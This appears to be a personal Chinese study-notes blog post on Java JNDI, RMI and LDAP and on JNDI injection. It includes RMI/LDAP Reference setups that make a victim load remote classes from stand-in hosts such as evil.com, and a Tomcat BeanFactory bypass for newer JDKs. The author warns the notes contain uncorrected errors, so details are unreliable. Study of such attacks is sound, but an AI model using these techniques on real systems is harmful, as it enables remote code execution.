---
title: "Java学习笔记Ⅵ"
slug: "java-study-notes-06"
description: "JNDI注入相关慢通记录 | *有大量修正未同步，请勿参考本文学习"
date: 2022-06-20T15:25:44+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

仅学习记录自用，请勿作参考（

----

# 前置

## 命名&目录服务

- 命名服务是将名称与值相关联的实体，称为"绑定"。它提供了一种使用"find"或"search"操作来根据名称查找对象的便捷方式，比如DNS和RMI Registry
- 目录服务是一种特殊的命名服务，允许存储和搜索"目录对象"，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。

## JNDI

Java Naming and Directory Interface，是Java提供的API，包括Naming Service和Directory Service，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）

- **原子名**是一个简单、基本、不可分割的组成部分
- **绑定**是名称与对象的关联，每个绑定都有一个不同的原子名
- **复合名**包含零个或多个原子名，即由多个绑定组成
- **上下文**是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名
- 命名系统是一组关联的上下文
- 名称空间是命名系统中包含的所有名称
- 探索名称空间的起点称为初始上下文
- 要获取初始上下文，需要使用初始上下文工厂

JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind，比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的**JNDI动态协议转换**。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。

### 示例

- JNDI与RMI配合使用

```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:9999");
Context ctx = new InitialContext(env);

//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
ctx.bind("refObj", new RefObject());

//通过名称查找对象
ctx.lookup("refObj");
```

- JNDI与LDAP配合使用

```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
 "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

DirContext ctx = new InitialDirContext(env);

//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
```

### 动态协议转换

```java
Context ctx = new InitialContext();
ctx.lookup("rmi://attacker-server/refObj");
//ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
//ctx.lookup("iiop://attacker-server/bar");
```

上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据传递的URL协议自动转换与设置了对应的工厂与PROVIDER_URL

```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,"rmi://localhost:9999");
Context ctx = new InitialContext(env);

String name = "ldap://attacker-server/cn=bar,dc=test,dc=org";
//通过名称查找对象
ctx.lookup(name);
```

即使服务端提前设置了工厂与PROVIDER_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换

在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：

```java
public Object lookup(String name) throws NamingException {
    return getURLOrDefaultInitCtx(name).lookup(name);
}

protected Context getURLOrDefaultInitCtx(String name)
throws NamingException {
if (NamingManager.hasInitialContextFactoryBuilder()) {//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入
    return getDefaultInitCtx();
}
String scheme = getURLScheme(name);//尝试从名称解析URL中的协议
if (scheme != null) {
    Context ctx = NamingManager.getURLContext(scheme, myProps);//如果解析出了Schema协议，则尝试获取其对应的上下文环境
    if (ctx != null) {
   return ctx;
    }
}
return getDefaultInitCtx();
   }
```

### 命名引用

为了在命名或目录服务中绑定Java对象，可以使用Java序列化传输对象，例如上面示例的第一个例子，将一个对象绑定到了远程服务器，就是通过反序列化将对象传输过去的。但是，并非总是通过序列化去绑定对象，因为它可能太大或不合适。为了满足这些需求，JNDI定义了命名引用，以便对象可以通过绑定由命名管理器解码并解析为原始对象的一个引用间接地存储在命名或目录服务中。

引用由Reference类表示，并且由地址和有关被引用对象的类信息组成，每个地址都包含有关如何构造对象。

Reference可以使用工厂来构造对象。当使用lookup查找对象时，Reference将使用工厂提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象：

```java
Reference reference = new Reference("MyClass","MyClass",FactoryURL);
ReferenceWrapper wrapper = new ReferenceWrapper(reference);
ctx.bind("Foo", wrapper);
```

### 远程代码库和安全管理器

在JNDI栈中，不是所有的组件都被同等对待。当验证从何处加载远程类时JVM的行为不同。从远程加载类有两个不同的级别：

- 命名管理器级别
- 服务提供者接口（SPI）级别

JNDI体系结构：

![img](https://images.seebug.org/content/images/2019/12/05/1575516121000-13.png-w331s)

在SPI级别，JVM将允许从远程代码库加载类并实施安全性。管理器的安装取决于特定的提供程序（例如在上面说到的RMI那些利用方式就是SPI级别，必须设置安全管理器）：

| Provider | Property to enable remote class loading                      | 是否需要强制安装Security Manager |
| :------- | :----------------------------------------------------------- | :------------------------------- |
| RMI      | java.rmi.server.useCodebaseOnly = false (**JDK 6u45、JDK 7u21之后默认为true**) | 需要                             |
| LDAP     | com.sun.jndi.ldap.object.trustURLCodebase = true（default = false） | 非必须                           |
| CORBA    |                                                              | 需要                             |

但是，在Naming Manager层放宽了安全控制。解码JNDI命名时始终允许引用从远程代码库加载类，而没有JVM选项可以禁用它，并且不需要强制安装任何安全管理器，例如上面说到的命名引用那种方式。

### 结构

在`Java JDK`里面提供了5个包，提供给`JNDI`的功能实现，分别是：

- javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。
- javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；
- javax.naming.event：在命名目录服务器中请求事件通知；
- javax.naming.ldap：提供LDAP支持；
- javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。

#### InitialContext

构造

```java
//构建一个初始上下文。
InitialContext()
//构造一个初始上下文，并选择不初始化它。
InitialContext(boolean lazy)
//使用提供的环境构建初始上下文。
InitialContext(Hashtable<?,?> environment)
```

常用方法

```java
//将名称绑定到对象。
bind(Name name, Object obj)
//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
list(String name)
//检索命名对象。
lookup(String name)
//将名称绑定到对象，覆盖任何现有绑定。
rebind(String name, Object obj)
//取消绑定命名对象。
unbind(String name)
```

示例

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndi {
    public static void main(String[] args) throws NamingException {
        String uri = "rmi://127.0.0.1:1099/work";
        //在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
```

#### Reference

该类也是在`javax.naming`的一个类，该类表示对在命名/目录系统外部找到的对象的引用，提供了`JNDI`中类的引用功能

Java为了将Object对象存储在Naming或Directory服务下，提供了Naiming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI LDAP等

构造

```java
//为类名为“className”的对象构造一个新的引用。
Reference(String className)
//为类名为“className”的对象和地址构造一个新引用。
Reference(String className, RefAddr addr)
//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。
Reference(String className, RefAddr addr, String factory, String factoryLocation)
//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。
Reference(String className, String factory, String factoryLocation)

/*
参数：
className 远程加载时所使用的类名，如果本地没有从远程加载
factory  加载的class中需要实例化类的名称，远程的工厂类
factoryLocation  提供classes数据的工厂类加载的地址，可以是file/ftp/http协议
*/
```

常用

```java
//将地址添加到索引posn的地址列表中。
void add(int posn, RefAddr addr)
//将地址添加到地址列表的末尾。
void add(RefAddr addr)
//从此引用中删除所有地址。
void clear()
//检索索引posn上的地址。
RefAddr get(int posn)
//检索地址类型为“addrType”的第一个地址。
RefAddr get(String addrType)
//检索本参考文献中地址的列举。
Enumeration<RefAddr> getAll()
//检索引用引用的对象的类名。
String getClassName()
//检索此引用引用的对象的工厂位置。
String getFactoryClassLocation()
//检索此引用引用对象的工厂的类名。
String getFactoryClassName()
//从地址列表中删除索引posn上的地址。
Object remove(int posn)
//检索此引用中的地址数。
int size()
//生成此引用的字符串表示形式。
String toString()
```

示例：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class jndi {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        String url = "http://127.0.0.1:8080";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("testrefClassName", "testFactoryClassName", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("testrefObj",referenceWrapper);
		// 也可以用JNDI的 ctx.bind("aa", referenceWrapper);
    }
}
```

可以看到在创建Reference对象后又用ReferenceWrapper进行封装，原因是Reference没有Remote接口也没有继承UnicastRemoteObject类，而这两个条件是注册到RMI Registry的必要条件，所以需要封装

当有客户端通过 `lookup("refObj")` 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference类的实例，客户端会首先去本地的 `CLASSPATH` 去寻找被标识为 `testrefClassName` 的类，如果本地未找到，则会去请求 `http://127.0.0.1:8080/testFactoryClassName.class` 加载工厂类

#### 与RMI的对比

最简单的区别：

- RMI的引入包

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import remote.IRemoteMath;
```

- JNDI的引入包

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;
```

服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中

客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的

- RMI的写法

写法1

```java
// 服务端
IRemoteMath remoteMath = new RemoteMath();
LocateRegistry.createRegistry(1099);
Registry registry = LocateRegistry.getRegistry();
registry.bind("Compute", remoteMath);

// 客户端
Registry registry = LocateRegistry.getRegistry("localhost");
IRemoteMath remoteMath = (IRemoteMath)registry.lookup("Compute");
```

写法2

```java
// 服务端
PersonService personService=new PersonServiceImpl();
LocateRegistry.createRegistry(6600);
Naming.rebind("rmi://127.0.0.1:6600/PersonService",personService);

// 客户端
PersonService personService=(PersonService) Naming.lookup("rmi://127.0.0.1:6600/PersonService");
```

- JNDI写法

```java
//服务端
LocateRegistry.createRegistry(6666);
System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sunjndi.rmi.registry.RegistryContextFactory");
System.setProperty(Context.PROVIDER_URL, "rmi:/localhost:6666");
InitialContext ctx = new InitialContext();
...
ctx.bind("person", p);
ctx.close();

//客户端
InitialContext ctx = new InitialContext();
Person person = (Person) ctx.lookup("person");
ctx.close();
```

```java
// 或
//服务端
Properties env = new Properties();
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,"rmi://localhost:1099");
Context ctx = new InitialContext(env);
```



## LDAP

Lightweight Directory Access Protocol 轻型目录访问协议，是一种目录服务协议，运行在TCP/IP堆栈之上；LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据

- 目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目
- 条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）
- 对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来
- 属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。如javaCodeBase、objectClass、javaFactory、javaSerializedData、javaRemoteLocation等属性，在后面的利用中会用到这些属性

### 关键字

| **关键字** | **英文全称**       | **含义**                                                     |
| :--------- | :----------------- | :----------------------------------------------------------- |
| **dc**     | Domain Component   | 域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com（一条记录的所属位置） |
| **uid**    | User Id            | 用户ID songtao.xu（一条记录的ID）                            |
| **ou**     | Organization Unit  | 组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如"employees"（一条记录的所属组织单位） |
| **cn**     | Common Name        | 公共名称，如"Thomas Johansson"（一条记录的名称）             |
| **sn**     | Surname            | 姓，如"xu"                                                   |
| **dn**     | Distinguished Name | 由有多个其他属性组成，如"uid=songtao.xu,ou=oa组,dc=example,dc=com"，一条记录的位置（唯一） |
| **rdn**    | Relative dn        | 相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid=tom”或“cn= Thomas Johansson” |

LDAP 的目录信息是以树形结构进行存储的，在树根一般定义国家（c=CN）或者域名（dc=com），其次往往定义一个或多个组织（organization，o）或组织单元（organization unit，ou）。一个组织单元可以包含员工、设备信息（计算机/打印机等）相关信息。例如为公司的员工设置一个DN，可以基于cn或uid（User ID）作为用户账号。如example.com的employees单位员工longofo的DN可以设置为下面这样：

```
uid=longofo,ou=employees,dc=example,dc=com
```

用树形结构表示就是下面这种形式（Person绑定的是类对象）：

![img](https://images.seebug.org/content/images/2019/12/05/1575516121000-17.png-w331s)

# JNDI注入

JNDI注入是BlackHat2016 USA的一个议题[A Journey From JNDI LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)提出的，最早起源是野外发现的Java Applets 点击播放绕过漏洞（CVE-2015-4902），它的攻击过程可以简单概括为以下几步：

1. 恶意applet使用JNLP实例化JNDI InitialContext
2. javax.naming.InitialContext的构造函数将请求应用程序的JNDI.properties（JNDI配置文件来自恶意网站）
3. 恶意Web服务器将JNDI.properties发送到客户端，内容为：java.naming.provider.url = rmi://attacker-server/Go
4. 在受害者的InitialContext初始化期间查找rmi//attacker-server/Go，攻击者控制的注册表将返回JNDI引用 （javax.naming.Reference）
5. 服务器从RMI注册表接收到JNDI引用后，它将从攻击者控制的服务器获取工厂类，然后实例化工厂以返回 JNDI所引用的对象的新实例
6. 由于攻击者控制了工厂类，因此他可以轻松返回带有静态变量的类初始化程序，运行由攻击者定义的任何Java代码，实现远程代码执行

相同的原理也可以应用于Web应用中。对于**JNDI注入**，有以下两个点需要注意：

1. 仅由InitialContext或其子类初始化的Context对象（InitialDirContext或InitialLdapContext）容易受到JNDI注入攻击
2. 一些InitialContext属性可以被传递给查找的地址/名称覆盖，即上面提到的JNDI动态协议转换

不仅仅是`InitialContext.lookup()`方法会受到影响，其他方法例如`InitialContext.rename()`、 `InitialContext.lookupLink()`最后也调用了`InitialContext.lookup()`。还有其他包装了JNDI的应用，例如Apache's Shiro JndiTemplate、Spring's JndiTemplate也会调用`InitialContext.lookup()`，看下Apache Shiro的JndiTemplate.lookup()：

## 攻击向量

类型

- RMI
- JNDI Reference
- Remote Object（有安全管理器的限制，在上面RMI利用部分也能看到）
- LDAP
- Serialized Object
- JNDI Reference
- Remote Location
- CORBA（议题中有）
- IOR

版本很重要，JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样

- JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
- JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
- JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。

## 安全管理器

Java中的对象分为本地对象和远程对象，本地默认可信任，为了管理和限制就出现了security manager

![img](https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/3.png)

对于加载远程对象，JNDI有两种安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制

![img](https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/4.png)

## RMI+Reference

**\*攻击客户端**

Reference中包含被引用对象的类信息和地址，JNDI中对象传递要么是序列化方式（对象拷贝，对应按值传递），要么是按照引用来存储（对象引用），比如Reference

使用RMI Remote Object的方式利用限制很大，但是使用RMI+JNDI Reference就没有那些限制，不过在JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类

**思路：**将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行**

![img](https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png)

1. 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 `rmi://evil.com:1099/refObj`；
2. 原先配置好的上下文环境 `rmi://localhost:1099` 会因为动态环境转换而被指向 `rmi://evil.com:1099/`；
3. 应用去 `rmi://evil.com:1099` 请求绑定对象 `refObj`，攻击者事先准备好的 RMI 服务会返回与名称 `refObj`想绑定的 ReferenceWrapper 对象（`Reference("EvilObject", "EvilObject", "http://evil-cb.com/")`）；
4. 应用获取到 `ReferenceWrapper` 对象开始从本地 `CLASSPATH` 中搜索 `EvilObject` 类，如果不存在则会从 `http://evil-cb.com/` 上去尝试获取 `EvilObject.class`，即动态的去获取 `http://evil-cb.com/EvilObject.class`；
5. 攻击者事先准备好的服务返回编译好的包含恶意代码的 `EvilObject.class`；
6. 应用开始调用 `EvilObject` 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；

示例：

```java
Reference reference = new Reference("Exploit","Exploit","http://evilHost/" );
registry.bind("Exploit", new ReferenceWrapper(reference));
```

此时，假设使用 `rmi` 协议，客户端通过 `lookup` 函数请求上面 `bind` 设置的 `Exploit`

```java
Properties env = new Properties();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
Context ctx = new InitialContext(env);
System.out.println("[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo");
ctx.lookup("demo");
```

因为绑定的是 `Reference` 对象，客户端在本地 `CLASSPATH` 查找 `Exploit` 类，如果没有则根据设定的 `Reference` 属性，到`URL`： [http://evilHost/Exploit.class](http://evilhost/Exploit.class) 获取构造对象实例，构造方法中的恶意代码就会被执行

![img](https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/10.png)

## LDAP+Reference

除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如`ldap://xxx/xxx`，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象

**注意：**LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制

所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用

所以，利用前提是JDK8u91, 7u201, 6u211以下

```java
Context ctx = new InitialContext();
ctx.lookup("ldap://localhost:1234/EvilObject");
```

## RMI

### 低版本

服务端

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ServerExp {

    public static void main(String args[]) {

        try {
            Registry registry = LocateRegistry.createRegistry(1099);

            String factoryUrl = "http://localhost:1098/";
            Reference reference = new Reference("EvilClass","EvilClass", factoryUrl);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("Foo", wrapper);

            System.err.println("Server ready, factoryUrl:" + factoryUrl);
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
```

客户端

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.directory.*;
import java.util.Hashtable;

public class JNDILookup {
    public static void main(String[] args) {
        try {
            Object ret = new InitialContext().lookup("rmi://127.0.0.1:1099/Foo");
            System.out.println("ret: " + ret);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```

恶意类

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class EvilClass implements ObjectFactory {
    static void log(String key) {
        try {
            System.out.println("EvilClass: " + key);
        } catch (Exception e) {
            // do nothing
        }
    }

    {
        EvilClass.log("IIB block");
    }

    static {
        EvilClass.log("static block");
    }

    public EvilClass() {
        EvilClass.log("constructor");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        EvilClass.log("getObjectInstance");
        return null;
    }
}
```

执行顺序

```
static在类加载的时候执行
代码块和无参构造方法在clas.newInstance()时执行
```

### 高版本

`JDK 6u132`、`7u122`、`8u113` 开始 `com.sun.jndi.rmi.object.trustURLCodebase` 默认值为`false`，运行时需加入参数 `-Dcom.sun.jndi.rmi.object.trustURLCodebase=true` 。因为如果 `JDK` 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 `RMI` 代码

深入代码中，问题出在高版本JDK中的` com.sun.jndi.rmi.registry.RegistryContext#decodeObject`

![analysis1.png](https://storage.tttang.com/media/attachment/2022/05/25/9c1c98e2-c3cd-48dd-bf2b-812e1e3176e8.png)

其中 `getFactoryClassLocation()`方法是获取`classFactoryLocation`地址，可以看到，在 `ref != null && ref.getFactoryClassLocation() != null` 的情况下，会对 `trustURLCodebase` 进行取反，由于在 `JDK 6u132`、`7u122`、`8u113` 版本及以后， `com.sun.jndi.rmi.object.trustURLCodebase` 默认为 `false` ，所以会进入 `if` 语句，抛出异常

#### 绕过

如果要解码的对象 `r` 是远程引用，就需要先解引用然后再调用 `NamingManager.getObjectInstance`，其中会实例化对应的 `ObjectFactory` 类并调用其 `getObjectInstance` 方法，这也符合我们前面打印的 `EvilClass` 的执行顺序

为了绕过这里 `ConfigurationException` 的限制，我们有三种思路

- 令 `trustURLCodebase` 为 `true`

在命令行指定 `com.sun.jndi.rmi.object.trustURLCodebase` 参数，前面用过

- 令 `ref` 为空

从语义上看需要 `obj` 既不是 `Reference` 也不是 `Referenceable`。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 `RMI` 没有操作的空间，因此这种情况不太好利用

- 令 `ref.getFactoryClassLocation()` 为空

让 `ref` 对象的 `classFactoryLocation` 属性为空，这个属性表示引用所指向对象的对应 `factory` 名称，对于远程代码加载而言是 `codebase`，即远程代码的 `URL` 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 `factory` 是本地代码，则该值为空，这是绕过高版本 `JDK` 限制的关键；

为了满足这种方法，我们只需要在远程 `RMI` 服务器返回的 `Reference` 对象中不指定 `Factory` 的 `codebase`，接着看javax.naming.spi.NamingManager#getObejctInstance的解析过程

```java
public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{
    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively
            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;
        } else {
            // if reference has no factory, check for addresses
            // containing URLs
            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }
    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

可以看到在处理 `Reference` 对象时，会先调用 `ref.getFactoryClassName()` 获取对应工厂类的名称，也就是会先从本地的`CLASSPATH`中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。之后会执行静态代码块、代码块、无参构造函数和`getObjectInstance`方法。那么只需要在攻击者本地`CLASSPATH`找到这个`Reference Factory`类并且在这四个地方其中一块能执行`payload`就可以了。但`getObjectInstance`方法需要你的类实现`javax.naming.spi.ObjectFactory`接口

因此，我们实际上可以指定一个存在于目标 `classpath` 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。

整个利用过程的主要调用栈如下：

```
InitialContext#lookup()
  RegistryContext#lookup()
    RegistryContext#decodeObject()
      NamingManager#getObjectInstance()
          objectfactory = NamingManager#getObjectFactoryFromReference()
                  Class#newInstance()  //-->恶意代码被执行
     或:   objectfactory#getObjectInstance()  //-->恶意代码被执行
```

满足要求的工厂类条件：

-  存在于目标本地的 `CLASSPATH` 中
-  实现 `javax.naming.spi.ObjectFactory` 接口
-  至少存在一个 `getObjectInstance()` 方法

存在于 `Tomcat` 依赖包中的 `org.apache.naming.factory.BeanFactory` 就是个不错的选择
`org.apache.naming.factory.BeanFactory` ，这个类在 `Tomcat` 中，很多 `web` 应用都会包含，它的关键代码如下

```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                Hashtable<?,?> environment)
    throws NamingException {

    Reference ref = (Reference) obj;
    String beanClassName = ref.getClassName();
    ClassLoader tcl = Thread.currentThread().getContextClassLoader();
    // 1. 反射获取类对象
    if (tcl != null) {
        beanClass = tcl.loadClass(beanClassName);
    } else {
        beanClass = Class.forName(beanClassName);
    }
    // 2. 初始化类实例
    Object bean = beanClass.getConstructor().newInstance();

    // 3. 根据 Reference 的属性查找 setter 方法的别名
    RefAddr ra = ref.get("forceString");
    String value = (String)ra.getContent();

    // 4. 循环解析别名并保存到字典中
    for (String param: value.split(",")) {
        param = param.trim();
        index = param.indexOf('=');
        if (index >= 0) {
            setterName = param.substring(index + 1).trim();
            param = param.substring(0, index).trim();
        } else {
            setterName = "set" +
                param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                param.substring(1);
        }
        forced.put(param, beanClass.getMethod(setterName, paramTypes));
    }

    // 5. 解析所有属性，并根据别名去调用 setter 方法
    Enumeration<RefAddr> e = ref.getAll();
    while (e.hasMoreElements()) {
        ra = e.nextElement();
        String propName = ra.getType();
        String value = (String)ra.getContent();
        Object[] valueArray = new Object[1];
        Method method = forced.get(propName);
        if (method != null) {
            valueArray[0] = value;
            method.invoke(bean, valueArray);
        }
        // ...
    }
}
```

上面注释标注了关键的部分，我们可以通过在返回给客户端的 `Reference` 对象的 `forceString` 字段指定 `setter` 方法的别名，并在后续初始化过程中进行调用。`forceString` 的格式为 `a=foo,bar`，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 `setter` 方法为等号后的值 `foo`，如果不包含等号，则 `setter` 方法为默认值 `setBar`

